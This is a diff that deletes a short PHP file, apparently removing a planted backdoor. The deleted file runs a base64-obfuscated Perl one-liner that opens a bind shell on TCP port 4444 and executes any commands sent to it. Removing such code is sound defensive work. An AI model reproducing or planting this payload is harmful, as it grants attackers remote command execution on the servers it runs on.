@@ -1,3 +1,0 @@
-<?php
-system(base64_decode('cGVybCAtTUlPIC1lICckcD1mb3JrKCk7ZXhpdCxpZiRwOyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKExvY2FsUG9ydCw0NDQ0LFJldXNlLDEsTGlzdGVuKS0+YWNjZXB0OyR+LT5mZG9wZW4oJGMsdyk7U1RESU4tPmZkb3BlbigkYyxyKTtzeXN0ZW0kXyB3aGlsZTw+Jw=='));
-?>
